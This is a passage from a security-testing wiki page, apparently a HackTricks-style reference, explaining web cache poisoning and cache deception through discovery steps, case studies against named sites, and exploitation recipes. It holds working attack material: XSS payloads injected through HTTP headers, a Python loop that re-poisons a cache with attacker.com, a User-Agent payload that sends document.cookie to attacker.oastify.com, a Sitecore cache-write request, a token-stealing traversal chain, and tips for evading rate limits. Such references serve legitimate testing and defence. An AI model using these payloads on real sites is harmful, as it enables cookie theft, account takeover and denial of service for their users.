  > **What is the difference between web cache poisoning and web cache deception?**\n>\n> - In **web cache poisoning**, the\
  \ attacker causes the application to store some malicious content in the cache, and this content is served from the cache\
  \ to other application users.\n> - In **web cache deception**, the attacker causes the application to store some sensitive\
  \ content belonging to another user in the cache, and the attacker then retrieves this content from the cache.\n\n## Cache\
  \ Poisoning\n\nCache poisoning is aimed at manipulating the client-side cache to force clients to load resources that are\
  \ unexpected, partial, or under the control of an attacker. The extent of the impact is contingent on the popularity of\
  \ the affected page, as the tainted response is served exclusively to users visiting the page during the period of cache\
  \ contamination.\n\nThe execution of a cache poisoning assault involves several steps:\n\n1. **Identification of Unkeyed\
  \ Inputs**: These are parameters that, although not required for a request to be cached, can alter the response returned\
  \ by the server. Identifying these inputs is crucial as they can be exploited to manipulate the cache.\n2. **Exploitation\
  \ of the Unkeyed Inputs**: After identifying the unkeyed inputs, the next step involves figuring out how to misuse these\
  \ parameters to modify the server's response in a way that benefits the attacker.\n3. **Ensuring the Poisoned Response is\
  \ Cached**: The final step is to ensure that the manipulated response is stored in the cache. This way, any user accessing\
  \ the affected page while the cache is poisoned will receive the tainted response.\n\n### Discovery: Check HTTP headers\n\
  \nUsually, when a response was **stored in the cache** there will be a **header indicating so**, you can check which headers\
  \ you should pay attention to in this post: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).\n\
  \n### Discovery: Caching error codes\n\nIf you are thinking that the response is being stored in a cache, you could try\
  \ to **send requests with a bad header**, which should be responded to with a **status code 400**. Then try to access the\
  \ request normally and if the **response is a 400 status code**, you know it's vulnerable (and you could even perform a\
  \ DoS).\n\nYou can find more options in:\n\n\n{{#ref}}\ncache-poisoning-to-dos.md\n{{#endref}}\n\nHowever, note that **sometimes\
  \ these kinds of status codes aren't cached** so this test could not be reliable.\n\n### Discovery: Identify and evaluate\
  \ unkeyed inputs\n\nYou could use [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)\
  \ to **brute-force parameters and headers** that may be **changing the response of the page**. For example, a page may be\
  \ using the header `X-Forwarded-For` to indicate the client to load the script from there:\n\n```html\n<script type=\"text/javascript\"\
  \ src=\"//<X-Forwarded-For_value>/resources/js/tracking.js\"></script>\n```\n\n### Elicit a harmful response from the back-end\
  \ server\n\nWith the parameter/header identified check how it is being **sanitised** and **where** is it **getting reflected**\
  \ or affecting the response from the header. Can you abuse it anyway (perform an XSS or load a JS code controlled by you?\
  \ perform a DoS?...)\n\n### Get the response cached\n\nOnce you have **identified** the **page** that can be abused, which\
  \ **parameter**/**header** to use and **how** to **abuse** it, you need to get the page cached. Depending on the resource\
  \ you are trying to get in the cache this could take some time, you might need to be trying for several seconds.\n\nThe\
  \ header **`X-Cache`** in the response could be very useful as it may have the value **`miss`** when the request wasn't\
  \ cached and the value **`hit`** when it is cached.\\\nThe header **`Cache-Control`** is also interesting to know if a resource\
  \ is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`\n\
  \nAnother interesting header is **`Vary`**. This header is often used to **indicate additional headers** that are treated\
  \ as **part of the cache key** even if they are normally unkeyed. Therefore, if the user knows the `User-Agent` of the victim\
  \ he is targeting, he can poison the cache for the users using that specific `User-Agent`.\n\nOne more header related to\
  \ the cache is **`Age`**. It defines the times in seconds the object has been in the proxy cache.\n\nWhen caching a request,\
  \ be **careful with the headers you use** because some of them could be **used unexpectedly** as **keyed** and the **victim\
  \ will need to use that same header**. Always **test** a Cache Poisoning with **different browsers** to check if it's working.\n\
  \n### Foundational cache poisoning case studies\n\n#### HackerOne global redirect via `X-Forwarded-Host`\n\n- The origin\
  \ templated redirects and canonical URLs with `X-Forwarded-Host`, but the cache key only used the `Host` header, so a single\
  \ response poisoned every visitor to `/`.\n- Poison with:\n\n```http\nGET / HTTP/1.1\nHost: hackerone.com\nX-Forwarded-Host:\
  \ evil.com\n```\n\n- Immediately re-request `/` without the spoofed header; if the redirect persists you have a global host-spoofing\
  \ primitive that often upgrades reflected redirects/Open Graph links into stored issues.\n\n#### GitHub repository DoS via\
  \ `Content-Type` + `PURGE`\n\n- Anonymous traffic was keyed only on path, while the backend entered an error state when\
  \ it saw an unexpected `Content-Type`. That error response was cacheable for every unauthenticated user of a repo.\n- GitHub\
  \ also (accidentally) honored the `PURGE` verb, letting the attacker flush a healthy entry and force caches to pull the\
  \ poisoned variant on demand:\n\n```bash\ncurl -H \"Content-Type: invalid-value\" https://github.com/user/repo\ncurl -X\
  \ PURGE https://github.com/user/repo\n```\n\n- Always compare authenticated vs anonymous cache keys, fuzz rarely keyed headers\
  \ such as `Content-Type`, and probe for exposed cache-maintenance verbs to automate re-poisoning.\n\n#### Shopify cross-host\
  \ persistence loops\n\n- Multi-layer caches sometimes require multiple identical hits before committing a new object. Shopify\
  \ reused the same cache across numerous localized hosts, so persistence meant impact on many properties.\n- Use short automation\
  \ loops to repeatedly reseed:\n\n```python\nimport requests, time\nfor i in range(100):\n    requests.get(\"https://shop.shopify.com/endpoint\"\
  ,\n                 headers={\"X-Forwarded-Host\": \"attacker.com\"})\n    time.sleep(0.1)\nprint(\"attacker.com\" in requests.get(\"\
  https://shop.shopify.com/endpoint\").text)\n```\n\n- After a `hit` response, crawl other hosts/assets that share the same\
  \ cache namespace to demonstrate cross-domain blast radius.\n\n#### JS asset redirect → stored XSS chain\n\n- Private programs\
  \ often host shared JS such as `/assets/main.js` across dozens of subdomains. If `X-Forwarded-Host` influences redirect\
  \ logic for those assets but is unkeyed, the cached response becomes a 301 to attacker JS, yielding stored XSS everywhere\
  \ the asset is imported.\n\n```http\nGET /assets/main.js HTTP/1.1\nHost: target.com\nX-Forwarded-Host: attacker.com\n```\n\
  \n- Map which hosts reuse the same asset path so you can prove multi-subdomain compromise.\n\n#### GitLab static DoS via\
  \ `X-HTTP-Method-Override`\n\n- GitLab served static bundles from Google Cloud Storage, which honors `X-HTTP-Method-Override`.\
  \ Overriding GET to HEAD returned a cacheable `200 OK` with `Content-Length: 0`, and the edge cache ignored the HTTP method\
  \ when generating the key.\n\n```http\nGET /static/app.js HTTP/1.1\nHost: gitlab.com\nX-HTTP-Method-Override: HEAD\n```\n\
  \n- A single request replaced the JS bundle with an empty body for every GET, effectively DoSing the UI. Always test method\
  \ overrides (`X-HTTP-Method-Override`, `X-Method-Override`, etc.) against static assets and confirm whether the cache varies\
  \ on method.\n\n#### HackerOne static asset loop via `X-Forwarded-Scheme`\n\n- Rails’ Rack middleware trusted `X-Forwarded-Scheme`\
  \ to decide whether to enforce HTTPS. Spoofing `http` against `/static/logo.png` triggered a cacheable 301 so all users\
  \ subsequently received redirects (or loops) instead of the asset:\n\n```http\nGET /static/logo.png HTTP/1.1\nHost: hackerone.com\n\
  X-Forwarded-Scheme: http\n```\n\n- Combine scheme spoofing with host spoofing when possible to craft irreversible redirects\
  \ for highly visible resources.\n\n#### Cloudflare host-header casing mismatch\n\n- Cloudflare normalized the `Host` header\
  \ for cache keys but forwarded the raw casing to origins. Sending `Host: TaRgEt.CoM` triggered alternate behavior in origin\
  \ routing/templating while still populating the canonical lowercase cache bucket.\n\n```http\nGET / HTTP/1.1\nHost: TaRgEt.CoM\n\
  ```\n\n- Enumerate CDN tenants by replaying mixed-case hosts (and other normalized headers) and diff the cached response\
  \ versus the origin response to uncover shared-platform cache poisonings.\n\n#### Red Hat Open Graph meta poisoning\n\n\
  - Injecting `X-Forwarded-Host` inside Open Graph tags turned a reflected HTML injection into a stored XSS once the CDN cached\
  \ the page. Use a harmless cache buster during testing to avoid harming production users:\n\n```http\nGET /en?dontpoisoneveryone=1\
  \ HTTP/1.1\nHost: www.redhat.com\nX-Forwarded-Host: a.\"?><script>alert(1)</script>\n```\n\n- Social media scrapers consume\
  \ cached Open Graph tags, so a single poisoned entry distributes the payload far beyond direct visitors.\n\n## Exploiting\
  \ Examples\n\n### Easiest example\n\nA header like `X-Forwarded-For` is being reflected in the response unsanitized.\\\n\
  You can send a basic XSS payload and poison the cache so everybody that accesses the page will be XSSed:\n\n```html\nGET\
  \ /en?region=uk HTTP/1.1\nHost: innocent-website.com\nX-Forwarded-Host: a.\"><script>alert(1)</script>\"\n```\n\n_Note that\
  \ this will poison a request to `/en?region=uk` not to `/en`_\n\n### Cache poisoning to DoS\n\n\n{{#ref}}\ncache-poisoning-to-dos.md\n\
  {{#endref}}\n\n### Cache poisoning through CDNs\n\nIn **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)**\
  \ it's explained the following simple scenario:\n\n- The CDN will cache anything under `/share/`\n- The CDN will NOT decode\
  \ nor normalize `%2F..%2F`, therfore, it can be used as **path traversal to access other sensitive locations that will be\
  \ cached** like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`\n- The web server WILL decode and\
  \ normalize `%2F..%2F`, and will respond with `/api/auth/session`, which **contains the auth token**.\n\n### Using web cache\
  \ poisoning to exploit cookie-handling vulnerabilities\n\nCookies could also be reflected on the response of a page. If\
  \ you can abuse it to cause a XSS for example, you could be able to exploit XSS in several clients that load the malicious\
  \ cache response.\n\n```html\nGET / HTTP/1.1\nHost: vulnerable.com\nCookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd\"\
  %2balert(1)%2b\"\n```\n\nNote that if the vulnerable cookie is very used by the users, regular requests will be cleaning\
  \ the cache.\n\n### Generating discrepancies with delimiters, normalization and dots <a href=\"#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities\"\
  \ id=\"using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities\"></a>\n\nCheck:\n\n\n{{#ref}}\ncache-poisoning-via-url-discrepancies.md\n\
  {{#endref}}\n\n### Cache poisoning with path traversal to steal API key <a href=\"#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities\"\
  \ id=\"using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities\"></a>\n\n[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)\
  \ how it was possible to steal an OpenAI API key with an URL like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`\
  \ because anything matching `/share/*` will be cached without Cloudflare normalising the URL, which was done when the request\
  \ reached the web server.\n\nThis is also explained better in:\n\n\n{{#ref}}\ncache-poisoning-via-url-discrepancies.md\n\
  {{#endref}}\n\n### Using multiple headers to exploit web cache poisoning vulnerabilities <a href=\"#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities\"\
  \ id=\"using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities\"></a>\n\nSometimes you will need to **exploit\
  \ several unkeyed inputs** to be able to abuse a cache. For example, you may find an **Open redirect** if you set `X-Forwarded-Host`\
  \ to a domain controlled by you and `X-Forwarded-Scheme` to `http`.**If** the **server** is **forwarding** all the **HTTP**\
  \ requests **to HTTPS** and using the header `X-Forwarded-Scheme` as the domain name for the redirect. You can control where\
  \ the page is pointed by the redirect.\n\n```html\nGET /resources/js/tracking.js HTTP/1.1\nHost: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net\n\
  X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/\nX-Forwarded-Scheme: http\n```\n\n### Exploiting\
  \ with limited `Vary`header\n\nIf you found that the **`X-Host`** header is being used as **domain name to load a JS resource**\
  \ but the **`Vary`** header in the response is indicating **`User-Agent`**. Then, you need to find a way to exfiltrate the\
  \ User-Agent of the victim and poison the cache using that user agent:\n\n```html\nGET / HTTP/1.1\nHost: vulnerbale.net\n\
  User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM\nX-Host: attacker.com\n```\n\n### Fat Get\n\nSend a GET request with the\
  \ request in the URL and in the body. If the web server uses the one from the body but the cache server caches the one from\
  \ the URL, anyone accessing that URL will actually use the parameter from the body. Like the vuln James Kettle found at\
  \ the Github website:\n\n```\nGET /contact/report-abuse?report=albinowax HTTP/1.1\nHost: github.com\nContent-Type: application/x-www-form-urlencoded\n\
  Content-Length: 22\n\nreport=innocent-victim\n```\n\nThere it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)\n\
  \n### Parameter Cloacking\n\nFor example it's possible to separate **parameters** in ruby servers using the char **`;`**\
  \ instead of **`&`**. This could be used to put unkeyed parameters values inside keyed ones and abuse them.\n\nPortswigger\
  \ lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)\n\
  \n### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling\n\nLearn here about how to perform [Cache Poisoning\
  \ attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).\n\
  \n### Automated testing for Web Cache Poisoning\n\nThe [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)\
  \ can be used to automatically test for web cache poisoning. It supports many different techniques and is highly customizable.\n\
  \nExample usage: `wcvs -u example.com`\n\n### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached\
  \ .js)\n\nThis real-world pattern chains a header-based reflection primitive with CDN/WAF behavior to reliably poison the\
  \ cached HTML served to other users:\n\n- The main HTML reflected an untrusted request header (e.g., `User-Agent`) into\
  \ executable context.\n- The CDN stripped cache headers but an internal/origin cache existed. The CDN also auto-cached requests\
  \ ending in static extensions (e.g., `.js`), while the WAF applied weaker content inspection to GETs for static assets.\n\
  - Request flow quirks allowed a request to a `.js` path to influence the cache key/variant used for the subsequent main\
  \ HTML, enabling cross-user XSS via header reflection.\n\nPractical recipe (observed across a popular CDN/WAF):\n\n1) From\
  \ a clean IP (avoid prior reputation-based downgrades), set a malicious `User-Agent` via browser or Burp Proxy Match & Replace.\n\
  2) In Burp Repeater, prepare a group of two requests and use \"Send group in parallel\" (single-packet mode works best):\n\
  \   - First request: GET a `.js` resource path on the same origin while sending your malicious `User-Agent`.\n   - Immediately\
  \ after: GET the main page (`/`).\n3) The CDN/WAF routing race plus the auto-cached `.js` often seeds a poisoned cached\
  \ HTML variant that is then served to other visitors sharing the same cache key conditions (e.g., same `Vary` dimensions\
  \ like `User-Agent`).\n\nExample header payload (to exfiltrate non-HttpOnly cookies):\n\n```http\nUser-Agent: Mo00ozilla/5.0</script><script>new\
  \ Image().src='https://attacker.oastify.com?a='+document.cookie</script>\"\n```\n\nOperational tips:\n\n- Many CDNs hide\
  \ cache headers; poisoning may appear only on multi-hour refresh cycles. Use multiple vantage IPs and throttle to avoid\
  \ rate-limit or reputation triggers.\n- Using an IP from the CDN's own cloud sometimes improves routing consistency.\n-\
  \ If a strict CSP is present, this still works if the reflection executes in main HTML context and CSP allows inline execution\
  \ or is bypassed by context.\n\nImpact:\n\n- If session cookies aren’t `HttpOnly`, zero-click ATO is possible by mass-exfiltrating\
  \ `document.cookie` from all users who are served the poisoned HTML.\n\n\n### Sitecore pre‑auth HTML cache poisoning (unsafe\
  \ XAML Ajax reflection)\n\nA Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth\
  \ XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader`\
  \ (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:\n\n```http\nPOST\
  \ /-/xaml/Sitecore.Shell.Xaml.WebControl\nContent-Type: application/x-www-form-urlencoded\n\n__PARAMETERS=AddToCache(\"\
  key\",\"<html>…payload…</html>\")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1\n```\n\nThis writes arbitrary HTML under\
  \ an attacker‑chosen cache key, enabling precise poisoning once cache keys are known.\n\nFor full details (cache key construction,\
  \ ItemService enumeration and a chained post‑auth deserialization RCE):\n\n{{#ref}}\n../../network-services-pentesting/pentesting-web/sitecore/README.md\n\
  {{#endref}}\n\n## Vulnerable Examples\n\n### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))\n\
  \nATS forwarded the fragment inside the URL without stripping it and generated the cache key only using the host, path and\
  \ query (ignoring the fragment). So the request `/#/../?r=javascript:alert(1)` was sent to the backend as `/#/../?r=javascript:alert(1)`\
  \ and the cache key didn't have the payload inside of it, only host, path and query.\n\n### 403 and Storage Buckets\n\n\
  Cloudflare previously cached 403 responses. Attempting to access S3 or Azure Storage Blobs with incorrect Authorization\
  \ headers would result in a 403 response that got cached. Although Cloudflare has stopped caching 403 responses, this behavior\
  \ might still be present in other proxy services.\n\n### Injecting Keyed Parameters\n\nCaches often include specific GET\
  \ parameters in the cache key. For instance, Fastly's Varnish cached the `size` parameter in requests. However, if a URL-encoded\
  \ version of the parameter (e.g., `siz%65`) was also sent with an erroneous value, the cache key would be constructed using\
  \ the correct `size` parameter. Yet, the backend would process the value in the URL-encoded parameter. URL-encoding the\
  \ second `size` parameter led to its omission by the cache but its utilization by the backend. Assigning a value of 0 to\
  \ this parameter resulted in a cacheable 400 Bad Request error.\n\n### User Agent Rules\n\nSome developers block requests\
  \ with user-agents matching those of high-traffic tools like FFUF or Nuclei to manage server load. Ironically, this approach\
  \ can introduce vulnerabilities such as cache poisoning and DoS.\n\n### Illegal Header Fields\n\nThe [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230)\
  \ specifies the acceptable characters in header names. Headers containing characters outside of the specified **tchar**\
  \ range should ideally trigger a 400 Bad Request response. In practice, servers don't always adhere to this standard. A\
  \ notable example is Akamai, which forwards headers with invalid characters and caches any 400 error, as long as the `cache-control`\
  \ header is not present. An exploitable pattern was identified where sending a header with an illegal character, such as\
  \ `\\`, would result in a cacheable 400 Bad Request error.\n\n### Finding new headers\n\n[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)\n\
  \n## Cache Deception\n\nThe goal of Cache Deception is to make clients **load resources that are going to be saved by the\
  \ cache with their sensitive information**.\n\nFirst of all note that **extensions** such as `.css`, `.js`, `.png` etc are\
  \ usually **configured** to be **saved** in the **cache.** Therefore, if you access `www.example.com/profile.php/nonexistent.js`\
  \ the cache will probably store the response because it sees the `.js` **extension**. But, if the **application** is **replaying**\
  \ with the **sensitive** user contents stored in _www.example.com/profile.php_, you can **steal** those contents from other\
  \ users.\n\nOther things to test:\n\n- _www.example.com/profile.php/.js_\n- _www.example.com/profile.php/.css_\n- _www.example.com/profile.php/test.js_\n\
  - _www.example.com/profile.php/../test.js_\n- _www.example.com/profile.php/%2e%2e/test.js_\n- _Use lesser known extensions\
  \ such as_ `.avif`\n\nAnother very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\\\
  \nIn the example, it is explained that if you load a non-existent page like _http://www.example.com/home.php/non-existent.css_\
  \ the content of _http://www.example.com/home.php_ (**with the user's sensitive information**) is going to be returned and\
  \ the cache server is going to save the result.\\\nThen, the **attacker** can access _http://www.example.com/home.php/non-existent.css_\
  \ in their own browser and observe the **confidential information** of the users that accessed before.\n\nNote that the\
  \ **cache proxy** should be **configured** to **cache** files **based** on the **extension** of the file (_.css_) and not\
  \ base on the content-type. In the example _http://www.example.com/home.php/non-existent.css_ will have a `text/html` content-type\
  \ instead of a `text/css` mime type.\n\nLearn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).\n\
  \n### CSPT-assisted authenticated cache poisoning (Account Takeover)\n\nThis pattern combines a Client-Side Path Traversal\
  \ (CSPT) primitive in a Single-Page App (SPA) with extension-based CDN caching to publicly cache sensitive JSON that was\
  \ originally only available via an authenticated API call.\n\nHigh level idea:\n\n- A sensitive API endpoint requires a\
  \ custom auth header and is correctly marked as non-cacheable by origin.\n- Appending a static-looking suffix (for example,\
  \ .css) makes the CDN treat the path as a static asset and cache the response, often without varying on sensitive headers.\n\
  - The SPA contains CSPT: it concatenates a user-controlled path segment into the API URL while attaching the victim’s auth\
  \ header (for example, X-Auth-Token). By injecting ../.. traversal, the authenticated fetch is redirected to the cacheable\
  \ path variant (…/v1/token.css), causing the CDN to cache the victim’s token JSON under a public key.\n- Anyone can then\
  \ GET that same cache key without authentication and retrieve the victim’s token.\n\nExample\n\n- Sensitive endpoint (non-cacheable\
  \ at origin):\n\n```\nGET /v1/token HTTP/1.1\nHost: api.example.com\nX-Auth-Token: <REDACTED>\nAccept: application/json\n\
  \nHTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-cache, no-store, must-revalidate\nX-Cache: Miss from\
  \ cdn\n\n{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"}\n```\n\n- Static-looking suffix flips CDN to cacheable:\n\
  \n```\nGET /v1/token.css HTTP/1.1\nHost: api.example.com\nX-Auth-Token: <REDACTED>\nAccept: application/json\n\nHTTP/1.1\
  \ 200 OK\nContent-Type: application/json\nCache-Control: max-age=86400, public\nX-Cache: Hit from cdn\n\n{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"\
  }\n```\n\n- CSPT in SPA attaches auth header and allows traversal:\n\n```js\nconst urlParams = new URLSearchParams(window.location.search);\n\
  const userId = urlParams.get('userId');\n\nconst apiUrl = `https://api.example.com/v1/users/info/${userId}`;\n\nfetch(apiUrl,\
  \ {\n  method: 'GET',\n  headers: { 'X-Auth-Token': authToken }\n});\n```\n\n- Exploit chain:\n  1. Lure victim to a URL\
  \ that injects dot-segments into the SPA path parameter, e.g.:\n     - [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)\n\
  \  2. The SPA issues an authenticated fetch to:\n     - [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)\n\
  \  3. Browser normalization resolves it to:\n     - [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)\n\
  \  4. The CDN treats .css as a static asset and caches the JSON with Cache-Control: public, max-age=...\n  5. Public retrieval:\
  \ anyone can then GET https://api.example.com/v1/token.css and obtain the cached token JSON.\n\nPreconditions\n\n- SPA performs\
  \ authenticated fetch/XHR to the same API origin (or cross-origin with working CORS) and attaches sensitive headers or bearer\
  \ tokens.\n- Edge/CDN applies extension-based caching for static-looking paths (e.g., *.css, *.js, images) and does not\
  \ vary the cache key on the sensitive header.\n- Origin for the base endpoint is non-cacheable (correct), but the extension-suffixed\
  \ variant is allowed or not blocked by edge rules.\n\nValidation checklist\n\n- Identify sensitive dynamic endpoints and\
  \ try suffixes like .css, .js, .jpg, .json. Look for Cache-Control: public/max-age and X-Cache: Hit (or equivalent, e.g.,\
  \ CF-Cache-Status) while content remains JSON.\n- Locate client code that concatenates user-controlled input into API paths\
  \ while attaching auth headers. Inject ../ sequences to redirect the authenticated request to your target endpoint.\n- Confirm\
  \ the authenticated header is present on the retargeted request (e.g., in a proxy or via server-side logs) and that the\
  \ CDN caches the response under the traversed path.\n- From a fresh context (no auth), request the same path and confirm\
  \ the secret JSON is served from cache.\n\n## Automatic Tools\n\n- [**toxicache**](https://github.com/xhzeem/toxicache):\
